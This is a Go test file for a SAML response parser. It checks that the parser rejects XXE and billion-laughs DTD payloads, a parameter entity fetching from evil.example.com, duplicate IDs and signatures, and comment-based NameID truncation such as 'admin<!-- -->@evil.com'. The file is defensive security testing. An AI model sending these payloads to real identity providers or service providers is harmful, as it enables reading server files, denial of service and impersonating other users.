package samlsec

import (
	"errors"
	"testing"
)

func TestParse_DTDAndEntityRejected(t *testing.T) {
	cases := map[string]string{
		"doctype":        `<?xml version="1.0"?><!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1">&xxe;</samlp:Response>`,
		"entity":         `<!DOCTYPE x [<!ENTITY lol "lol">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1"/>`,
		"billion laughs": `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1"/>`,
		// 无 DTD 时自定义实体由标准解码器按畸形文档拒绝（DTD 路径已在上面封死）。
		"custom entity reference": `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1">&hax;</samlp:Response>`,
		"parameter entity":        `<!DOCTYPE r [<!ENTITY % pe SYSTEM "http://evil.example.com/x.dtd">%pe;]><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1"/>`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := Parse([]byte(doc), nil)
			if name == "custom entity reference" {
				if !errors.Is(err, ErrDTD) && !errors.Is(err, ErrMalformed) {
					t.Fatalf("expected ErrDTD/ErrMalformed, got %v", err)
				}
				return
			}
			if !errors.Is(err, ErrDTD) {
				t.Fatalf("expected ErrDTD, got %v", err)
			}
		})
	}
}

func TestParse_DuplicateIDRejected(t *testing.T) {
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_dup">
		<saml:Assertion ID="_dup" Version="2.0"><saml:Issuer>i</saml:Issuer></saml:Assertion>
	</samlp:Response>`
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrDuplicateID) {
		t.Fatalf("expected ErrDuplicateID, got %v", err)
	}
}

func TestParse_DuplicateXMLIDRejected(t *testing.T) {
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a" xml:id="_a" Version="2.0"/>`
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrDuplicateID) {
		t.Fatalf("expected ErrDuplicateID across ID/xml:id, got %v", err)
	}
}

func TestParse_DuplicateAttributeRejected(t *testing.T) {
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_a" ID="_b" Version="2.0"/>`
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrDuplicateAttribute) {
		t.Fatalf("expected ErrDuplicateAttribute, got %v", err)
	}
}

func TestParse_MultipleAssertionsRejected(t *testing.T) {
	key := loadTestKey()
	now := fixedNow()
	root := buildResponse(defaultFixture(now))
	key.sign(root.FindChild(NSSAML, "Assertion"))

	extra := deepClone(root.FindChild(NSSAML, "Assertion"))
	setID(t, extra, "_extra")
	adopt(root, extra)

	_, err := Parse([]byte(serializeXML(root)), nil)
	if !errors.Is(err, ErrMultipleAssertions) {
		t.Fatalf("expected ErrMultipleAssertions, got %v", err)
	}
}

func TestParse_MultipleSignaturesRejected(t *testing.T) {
	key := loadTestKey()
	now := fixedNow()
	root := buildResponse(defaultFixture(now))
	key.sign(root.FindChild(NSSAML, "Assertion"))

	dupSig := deepClone(root.FindDescendant(NSDSIG, "Signature"))
	adopt(root, dupSig)

	_, err := Parse([]byte(serializeXML(root)), nil)
	if !errors.Is(err, ErrMultipleSignatures) {
		t.Fatalf("expected ErrMultipleSignatures, got %v", err)
	}
}

func TestParse_CommentInsideNameIDRejected(t *testing.T) {
	key := loadTestKey()
	now := fixedNow()
	root := buildResponse(defaultFixture(now))
	key.sign(root.FindChild(NSSAML, "Assertion"))

	nameID := root.FindDescendant(NSSAML, "NameID")
	adopt(nameID, comment(" "))

	_, err := Parse([]byte(serializeXML(root)), nil)
	if !errors.Is(err, ErrSensitiveMarkup) {
		t.Fatalf("expected ErrSensitiveMarkup for NameID comment, got %v", err)
	}
}

func TestParse_ProcessingInstructionInsideSensitiveRejected(t *testing.T) {
	for _, local := range []string{"NameID", "Issuer", "Audience", "AttributeValue"} {
		t.Run(local, func(t *testing.T) {
			key := loadTestKey()
			now := fixedNow()
			root := buildResponse(defaultFixture(now))
			key.sign(root.FindChild(NSSAML, "Assertion"))

			target := root.FindDescendant(NSSAML, local)
			adopt(target, pi("evil", "cut()"))

			_, err := Parse([]byte(serializeXML(root)), nil)
			if !errors.Is(err, ErrSensitiveMarkup) {
				t.Fatalf("expected ErrSensitiveMarkup for PI in %s, got %v", local, err)
			}
		})
	}
}

func TestParse_NameIDTruncationAttackBlocked(t *testing.T) {
	// 直接验证需求中的典型载荷：admin<!-- -->@evil.com
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0">
	  <saml:Assertion ID="_a1" Version="2.0">
	    <saml:Subject><saml:NameID>admin<!-- -->@evil.com</saml:NameID></saml:Subject>
	  </saml:Assertion>
	</samlp:Response>`
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrSensitiveMarkup) {
		t.Fatalf("expected ErrSensitiveMarkup, got %v", err)
	}
}

func TestParse_CommentOutsideSensitiveKeptButExcludedFromText(t *testing.T) {
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"><!-- outer -->
	  <saml:Assertion ID="_a1" Version="2.0"><saml:Issuer>idp<!-- inner-non-sensitive? --></saml:Issuer></saml:Assertion>
	</samlp:Response>`
	// Issuer 属于敏感元素，内部注释仍必须拒绝。
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrSensitiveMarkup) {
		t.Fatalf("Issuer comment must be rejected, got %v", err)
	}

	doc2 := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"><!-- outer comment -->
	  <saml:Assertion ID="_a1" Version="2.0"><saml:Issuer>idp</saml:Issuer></saml:Assertion>
	</samlp:Response>`
	parsed, err := Parse([]byte(doc2), nil)
	if err != nil {
		t.Fatalf("outer comment is legal: %v", err)
	}
	if parsed.Root.FindChild(NSSAML, "Assertion").FindChild(NSSAML, "Issuer").TextContent() != "idp" {
		t.Fatalf("issuer text extraction broken")
	}
}

func TestParse_RootMustBeResponse(t *testing.T) {
	doc := `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0"/>`
	_, err := Parse([]byte(doc), nil)
	if !errors.Is(err, ErrRootInvalid) {
		t.Fatalf("expected ErrRootInvalid, got %v", err)
	}
}

func TestParse_MalformedXML(t *testing.T) {
	cases := []string{
		`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1">`,
		`not xml at all`,
		`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1"><saml:Issuer>x</samlp:Response>`,
	}
	for _, doc := range cases {
		if _, err := Parse([]byte(doc), nil); !errors.Is(err, ErrMalformed) {
			t.Fatalf("expected ErrMalformed for %q, got %v", doc, err)
		}
	}
}

func TestParse_PredefinedEntitiesAllowed(t *testing.T) {
	doc := `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0">
		<saml:Assertion ID="_a1" Version="2.0"><saml:Issuer>a&amp;b&lt;c&gt;d&quot;e&apos;f</saml:Issuer></saml:Assertion>
	</samlp:Response>`
	parsed, err := Parse([]byte(doc), nil)
	if err != nil {
		t.Fatalf("predefined entities must work: %v", err)
	}
	got := parsed.Root.FindDescendant(NSSAML, "Issuer").TextContent()
	if got != `a&b<c>d"e'f` {
		t.Fatalf("entity expansion = %q", got)
	}
}
